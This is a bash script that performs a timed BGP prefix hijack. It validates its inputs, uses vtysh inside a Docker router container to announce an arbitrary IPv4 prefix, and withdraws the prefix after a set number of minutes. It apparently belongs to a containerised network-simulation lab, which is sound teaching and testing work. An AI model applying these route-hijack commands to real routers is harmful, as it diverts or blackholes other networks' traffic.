# Description: Hijack a BGP route

while getopts 'a:r:p:t:' OPTION; do
    case "$OPTION" in
        a)
            as_number="$OPTARG"
            ;;
        r)
            router_name="$OPTARG"      
            ;;
        p)
            prefix="$OPTARG"
            ;;
        t)
            duration="$OPTARG"
            ;;
        ?)
            echo "script usage: ./hijack.sh [-a <AS number>] [-r <Router name>] [-p <Prefix to hijack>]" >&2
            exit 1
            ;;
    esac
done
shift "$(($OPTIND -1))"

if [ -z "$duration" ];then
    # Pick a random number to detirmine the duration of the hijack
    duration=$(( ( RANDOM % 9 ) + 1 )) # Random number between 1 and 10
elif [[ ! $duration =~ ^[0-9]+$ ]]; then
    echo "Error: Duration is not a number"
    exit 1
elif [ "$duration" -lt 1 ]; then
    echo "Error: Duration must be more than 1 minute"
    exit 1
fi



if [ -z "$as_number" ] || [ -z "$prefix" ] || [ -z "$router_name" ]; then
    echo "script usage: ./hijack.sh [-a <AS number>] [-r <Router name>] [-p <Prefix to hijack>] (-t <duration minutes>)" >&2
    echo "AS number, router name and prefix are required" >&2

    exit 1
fi

# Check wether the AS number is a number or not
if [[ ! $as_number =~ ^[0-9]+$ ]]; then
    echo "Error: Not an AS number"
    exit 1
fi

# Check wether the prefix is an IPv4 address or not
if [[ $prefix =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
    # Check quads are 0-255 and the subnet mask is 0-32
    IFS='/' read -r -a array <<< "$prefix"
    IFS='.' read -r -a quads <<< "${array[0]}"
    for quad in "${quads[@]}"; do
        if [ "$quad" -lt 0 ] || [ "$quad" -gt 255 ]; then
            echo "Error: Not an IPv4 address"
            exit 1
        fi
    done
    if [ "${array[1]}" -lt 0 ] || [ "${array[1]}" -gt 32 ]; then
        echo "Error: Not an IPv4 address"
        exit 1
    fi
else
    echo "Error: Not an IPv4 address"
    exit 1
fi

# Check wether the router name is a valid router name or not
if [[ ! $(docker ps -a --format '{{.Names}}' | grep "${as_number}_${router_name}router") ]] then
    echo "AS ${as_number} does not have a router named ${router_name}router"
    echo "Please check the AS number and router name"
    exit 1
fi 

# Check wether the router has the ability to hijack a prefix or not
if [[ ! $(docker exec -it "${as_number}_${router_name}router" vtysh -c 'show interface brief' | grep "hijack          up") ]] then
    echo "Router ${router_name}router does not have the ability to hijack a prefix"
    echo "Please check the router name"
    exit 1
fi

# Hijack the prefix
{
    echo "#!/bin/bash"
    echo "vtysh  -c 'conf t' \\"
    echo " -c 'interface hijack' \\"
    echo " -c 'ip address ${prefix}' \\"
    echo " -c 'exit' \\"
    echo " -c 'router bgp ${as_number}' \\"
    echo " -c 'network ${prefix}' \\"
    echo " -c 'exit' \\"
    echo " -c 'exit' \\"
} | docker exec -i "${as_number}_${router_name}router" bash

echo "Hijacking ${prefix} for ${duration} minute(s)"

# Sleep for the duration of the hijack
for (( i=duration; i>0; i-- )); do
    if [ "$i" -eq 1 ]; then
        echo "1 minute remaining"
    else
        echo "$((i)) minutes Remaining"
    fi
    sleep 1m
done

# Withdraw the prefix
{
    echo "#!/bin/bash"
    echo "vtysh  -c 'conf t' \\"
    echo " -c 'router bgp ${as_number}' \\"
    echo " -c 'no network ${prefix}' \\"
    echo " -c 'exit' \\"
    echo " -c 'interface hijack' \\"
    echo " -c 'no ip address ${prefix}' \\"
    echo " -c 'exit' \\"
    echo " -c 'exit' \\"
} | docker exec -i "${as_number}_${router_name}router" bash

echo "Prefix ${prefix} withdrawn"